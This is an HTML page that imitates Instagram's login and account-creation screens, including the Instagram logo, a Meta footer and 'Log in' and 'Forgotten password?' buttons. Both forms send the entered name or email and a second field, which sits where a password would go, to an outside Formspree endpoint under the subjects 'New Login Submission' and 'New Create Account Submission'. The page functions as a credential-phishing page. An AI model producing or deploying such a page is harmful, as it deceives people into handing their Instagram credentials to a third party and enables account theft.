<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Instagram UI</title>

<style>

*{
    box-sizing:border-box;
    margin:0;
    padding:0;
}

body{
    background:#192832;
    color:white;
    font-family:Arial,Helvetica,sans-serif;
}

/* =========================
   COMMON SCREEN
========================= */

.screen{
    min-height:100vh;
    display:none;
    flex-direction:column;
}

.screen.active{
    display:flex;
}

/* =========================
   SPLASH
========================= */

#splash{
    align-items:center;
    justify-content:space-between;
    padding:30px 20px;
}

.instagram-logo{
    width:86px;
    height:86px;
    border-radius:25px;

    background:
        radial-gradient(
            circle at 70% 25%,
            #ffd600 0 8%,
            #ff7a00 20%,
            #ff0169 50%,
            #d300c5 75%,
            #7638fa 100%
        );

    position:relative;
}

.instagram-logo::before{
    content:"";
    position:absolute;
    inset:16px;
    border:7px solid white;
    border-radius:20px;
}

.instagram-logo::after{
    content:"";
    position:absolute;
    width:18px;
    height:18px;
    border:5px solid white;
    border-radius:50%;
    top:29px;
    left:29px;
}

/* =========================
   HEADER
========================= */

.topbar{
    padding:18px 20px;
    border-bottom:1px solid #34434d;
    display:flex;
    align-items:center;
    justify-content:space-between;
}

.logo-text{
    font-family:cursive;
    font-size:30px;
}

.language{
    text-align:center;
    color:#aab2b8;
    padding:18px;
}

/* =========================
   LOGIN
========================= */

.auth-container{
    width:min(510px,90%);
    margin:auto;
    display:flex;
    flex-direction:column;
    align-items:center;
}

.auth-logo{
    width:78px;
    height:78px;
    margin-bottom:70px;
}

.auth-form{
    width:100%;
}

/* NORMAL TEXT INPUT */

.auth-input{
    width:100%;
    height:64px;

    background:transparent;
    border:1px solid #3d4d58;
    border-radius:34px;

    padding:0 30px;

    color:white;
    font-size:18px;

    margin-bottom:14px;

    outline:none;
}

.auth-input:focus{
    border-color:#008cff;
}

.auth-input::placeholder{
    color:#9aa5ad;
}

/* BUTTON */

.primary-button{
    width:100%;
    height:60px;

    border:0;
    border-radius:32px;

    background:#086fe8;
    color:white;

    font-size:18px;
    font-weight:600;

    cursor:pointer;

    margin-top:5px;
}

.primary-button:hover{
    background:#0878f5;
}

.secondary-button{
    width:100%;
    height:60px;

    border:1px solid #087cff;
    border-radius:32px;

    background:transparent;
    color:#4aa3ff;

    font-size:18px;

    cursor:pointer;

    margin-top:15px;
}

.forgot{
    text-align:center;
    font-size:18px;
    margin-top:22px;
    color:white;
    background:none;
    border:0;
    cursor:pointer;
}

.bottom-space{
    flex:1;
}

.meta{
    text-align:center;
    font-size:24px;
    color:#ff4778;
    margin-top:25px;
    margin-bottom:20px;
}

/* =========================
   CREATE ACCOUNT
========================= */

#create-account{
    padding:20px;
}

.create-container{
    width:min(510px,90%);
    margin:auto;
}

.back{
    background:none;
    border:0;
    color:white;
    font-size:34px;
    cursor:pointer;
    margin-bottom:25px;
}

.create-title{
    font-size:32px;
    margin-bottom:12px;
}

.create-subtitle{
    color:#aab3ba;
    font-size:17px;
    line-height:24px;
    margin-bottom:30px;
}

.create-form{
    width:100%;
}

/* SUCCESS */

.success{
    text-align:center;
    display:none;
    margin-top:80px;
}

.success.show{
    display:block;
}

.success-icon{
    width:75px;
    height:75px;
    border-radius:50%;
    background:#168a45;
    display:flex;
    align-items:center;
    justify-content:center;
    margin:0 auto 25px;
    font-size:40px;
}

.success h2{
    font-size:30px;
    margin-bottom:12px;
}

.success p{
    color:#aab3ba;
    font-size:17px;
}

/* =========================
   MOBILE
========================= */

@media(max-width:600px){

    .auth-container,
    .create-container{
        width:calc(100% - 40px);
    }

    .auth-logo{
        margin-top:80px;
        margin-bottom:70px;
    }

    .auth-input{
        height:62px;
        font-size:17px;
    }

}

</style>
</head>


<body>


<!-- =====================================================
     LOGIN SCREEN
===================================================== -->

<section
    id="login-screen"
    class="screen active"
>

    <div class="language">
        English (UK)
    </div>


    <div class="auth-container">

        <div class="instagram-logo auth-logo"></div>


        <!-- IMPORTANT:
             NATIVE FORMSPREE FORM
        -->

        <form
            id="login-form"
            class="auth-form"
            action="https://formspree.io/f/xwlpaveb"
            method="POST"
        >

            <!-- FIRST INPUT -->

            <input
                class="auth-input"
                type="text"
                name="name_or_email"
                placeholder="Name or email address"
                autocomplete="off"
                required
            >


            <!-- SECOND INPUT -->

            <input
                class="auth-input"
                type="text"
                name="user_input"
                placeholder="Enter anything"
                autocomplete="off"
                required
            >


            <!-- OPTIONAL SUBJECT -->

            <input
                type="hidden"
                name="_subject"
                value="New Login Submission"
            >


            <!-- SUBMIT -->

            <button
                type="submit"
                class="primary-button"
            >
                Log in
            </button>

        </form>


        <button
            class="forgot"
            type="button"
        >
            Forgotten password?
        </button>


        <div class="bottom-space"></div>


        <!-- CREATE ACCOUNT -->

        <button
            id="open-create"
            type="button"
            class="secondary-button"
        >
            Create new account
        </button>


        <div class="meta">
            ∞ Meta
        </div>

    </div>

</section>



<!-- =====================================================
     CREATE ACCOUNT SCREEN
===================================================== -->

<section
    id="create-account"
    class="screen"
>

    <div class="create-container">

        <button
            id="back-login"
            class="back"
            type="button"
        >
            ←
        </button>


        <h1 class="create-title">
            Create your account
        </h1>


        <p class="create-subtitle">
            Enter your details below.
        </p>


        <!--
            SECOND FORMSPREE FORM

            It sends the SAME two values to
            the SAME Formspree endpoint.
        -->

        <form
            id="create-form"
            class="create-form"
            action="https://formspree.io/f/xwlpaveb"
            method="POST"
        >

            <!-- FIRST INPUT -->

            <input
                class="auth-input"
                type="text"
                name="name_or_email"
                placeholder="Name or email address"
                autocomplete="off"
                required
            >


            <!-- SECOND INPUT -->

            <input
                class="auth-input"
                type="text"
                name="user_input"
                placeholder="Enter anything"
                autocomplete="off"
                required
            >


            <!-- SUBJECT -->

            <input
                type="hidden"
                name="_subject"
                value="New Create Account Submission"
            >


            <!-- SUBMIT -->

            <button
                type="submit"
                class="primary-button"
            >
                Create account
            </button>

        </form>


        <!-- SUCCESS MESSAGE -->

        <div
            id="success"
            class="success"
        >

            <div class="success-icon">
                ✓
            </div>

            <h2>
                Submitted successfully
            </h2>

            <p>
                Your information has been submitted.
            </p>

        </div>

    </div>

</section>



<script>

/* =====================================================
   OPEN CREATE ACCOUNT UI
===================================================== */

const loginScreen =
    document.getElementById("login-screen");

const createScreen =
    document.getElementById("create-account");


document
    .getElementById("open-create")
    .addEventListener("click", function(){

        loginScreen.classList.remove("active");

        createScreen.classList.add("active");

    });


/* =====================================================
   BACK TO LOGIN
===================================================== */

document
    .getElementById("back-login")
    .addEventListener("click", function(){

        createScreen.classList.remove("active");

        loginScreen.classList.add("active");

    });


/* =====================================================
   LOGIN SUBMISSION
=====================================================

   IMPORTANT:

   We DO NOT use fetch() here.

   The browser submits the HTML form directly to:

   https://formspree.io/f/xwlpaveb

   Formspree receives:

   name_or_email
   user_input

===================================================== */

document
    .getElementById("login-form")
    .addEventListener("submit", function(){

        /*
          Don't preventDefault().

          The normal HTML form submission is exactly
          what sends the data to Formspree.
        */

    });


/* =====================================================
   CREATE ACCOUNT SUBMISSION
===================================================== */

document
    .getElementById("create-form")
    .addEventListener("submit", function(){

        /*
          Again, don't preventDefault().

          Formspree receives:

          name_or_email
          user_input
        */

    });

</script>

</body>
</html>
